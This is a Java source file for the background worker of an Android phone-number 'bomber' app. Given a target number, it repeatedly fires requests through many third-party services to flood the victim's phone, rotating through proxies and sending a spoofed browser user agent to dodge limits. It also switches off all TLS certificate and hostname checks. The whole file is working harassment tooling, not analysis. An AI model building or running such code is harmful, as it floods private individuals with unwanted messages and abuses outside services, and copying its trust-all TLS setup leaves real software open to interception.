package com.dm.bomber.worker;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.TaskStackBuilder;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.work.Data;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.dm.bomber.R;
import com.dm.bomber.services.Phone;
import com.dm.bomber.services.Service;
import com.dm.bomber.services.ServicesRepository;
import com.dm.bomber.ui.MainActivity;
import com.dm.bomber.ui.MainRepository;
import com.google.firebase.analytics.FirebaseAnalytics;

import org.jetbrains.annotations.NotNull;

import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class AttackWorker extends Worker {

    private static final String TAG = "Attack";

    private static final String USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37";

    public static final String KEY_COUNTRY_CODE = "country_code";
    public static final String KEY_PHONE = "phone";
    public static final String KEY_REPEATS = "repeats";
    public static final String KEY_PROXY_ENABLED = "proxy_enabled";

    public static final String KEY_PROGRESS = "progress";
    public static final String KEY_MAX_PROGRESS = "max_progress";

    private static final String CHANNEL_ID = "attack";

    private int progress = 0;

    private CountDownLatch tasks;
    private boolean stopped;

    @SuppressLint({"CustomX509TrustManager", "TrustAllX509TrustManager"})
    private final TrustManager[] trustAllCerts = new TrustManager[]{
            new X509TrustManager() {
                @Override
                public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) {
                }

                @Override
                public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) {
                }

                @Override
                public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                    return new java.security.cert.X509Certificate[]{};
                }
            }
    };

    private static final OkHttpClient.Builder clientBuilder = new OkHttpClient.Builder()
            .callTimeout(7, TimeUnit.SECONDS)
            .addInterceptor(new UserAgentInterceptor(USER_AGENT))
            .addInterceptor(chain -> {
                Request request = chain.request();
                Log.v(TAG, "Sending request " + request.url());

                Response response = chain.proceed(request);
                Log.v(TAG, "Received response for " + response.request().url() + " with status code " + response.code());

                return response;
            });

    public AttackWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);

        setProgressAsync(new Data.Builder()
                .putInt(KEY_PROGRESS, 0)
                .putInt(KEY_MAX_PROGRESS, 0)
                .build());
    }

    @NonNull
    @Override
    public Result doWork() {
        try {
            SSLContext sslContext = SSLContext.getInstance("SSL");
            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());

            clientBuilder.sslSocketFactory(sslContext.getSocketFactory(), (X509TrustManager) trustAllCerts[0]);
            clientBuilder.hostnameVerifier((hostname, session) -> true);
        } catch (KeyManagementException | NoSuchAlgorithmException e) {
            e.printStackTrace();
        }

        OkHttpClient client = clientBuilder.build();

        List<AuthableProxy> proxies = getInputData().getBoolean(KEY_PROXY_ENABLED, false) ?
                new MainRepository(getApplicationContext()).getProxy() : new ArrayList<>();

        String countryCode = getInputData().getString(KEY_COUNTRY_CODE);
        String phone = getInputData().getString(KEY_PHONE);

        int repeats = getInputData().getInt(KEY_REPEATS, 1);

        Bundle params = new Bundle();
        params.putInt("repeats", repeats);
        params.putString("phone_number", countryCode + phone);
        FirebaseAnalytics.getInstance(getApplicationContext())
                .logEvent("attack", params);

        assert countryCode != null;
        assert phone != null;

        List<Service> usableServices = new ServicesRepository().getServices(countryCode);
        Log.i(TAG, "Starting attack on +" + countryCode + phone);

        client = client.newBuilder()
                .proxy(null)
                .build();

        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(getApplicationContext());

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = getApplicationContext().getString(R.string.attack);
            String description = getApplicationContext().getString(R.string.channel_description);

            int importance = NotificationManager.IMPORTANCE_LOW;

            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);

            notificationManager.createNotificationChannel(channel);
        }

        attack:
        for (int cycle = 0; cycle < repeats; cycle++) {
            Log.i(TAG, "Started cycle " + cycle);
            tasks = new CountDownLatch(usableServices.size());

            if (!proxies.isEmpty()) {
                AuthableProxy authableProxy = proxies.get(cycle % proxies.size());

                client = client.newBuilder()
                        .proxy(authableProxy)
                        .proxyAuthenticator(authableProxy)
                        .build();
            }

            for (Service service : usableServices) {

                if (isStopped()) {
                    break attack;
                }

                service.run(client, new com.dm.bomber.services.Callback() {
                    @Override
                    public void onError(@NotNull Call call, @NotNull Exception e) {
                        Log.e(TAG, "An error occurred during the call " + call, e);
                        tasks.countDown();
                    }

                    @Override
                    public void onResponse(@NotNull Call call, @NotNull Response response) {
                        if (!stopped) {
                            Intent intent = new Intent(getApplicationContext(), MainActivity.class);
                            intent.putExtra(MainActivity.TASK_ID, getId().toString());

                            TaskStackBuilder stackBuilder = TaskStackBuilder.create(getApplicationContext());
                            stackBuilder.addParentStack(MainActivity.class);
                            stackBuilder.addNextIntent(intent);

                            PendingIntent pendingIntent = stackBuilder.getPendingIntent(0,
                                    android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE : PendingIntent.FLAG_UPDATE_CURRENT);

                            Notification notification = new NotificationCompat.Builder(getApplicationContext(), CHANNEL_ID)
                                    .setContentTitle(getApplicationContext().getString(R.string.attack))
                                    .setContentText("+" + countryCode + phone)
                                    .setProgress(usableServices.size() * repeats, progress, false)
                                    .setOngoing(true)
                                    .setSmallIcon(R.drawable.logo)
                                    .setPriority(NotificationCompat.PRIORITY_HIGH)
                                    .addAction(R.drawable.logo, getApplicationContext().getString(R.string.stop), pendingIntent)
                                    .build();

                            notification.flags |= Notification.FLAG_ONGOING_EVENT;

                            notificationManager.notify(getId().hashCode(), notification);

                            setProgressAsync(new Data.Builder()
                                    .putInt(KEY_PROGRESS, progress++)
                                    .putInt(KEY_MAX_PROGRESS, usableServices.size() * repeats)
                                    .build());
                        }
                        tasks.countDown();
                    }
                }, new Phone(countryCode, phone));

                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }

            try {
                tasks.await();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        stopped = true;
        notificationManager.cancel(getId().hashCode());

        Log.i(TAG, "Attack ended +" + countryCode + phone);
        return Result.success();
    }
}
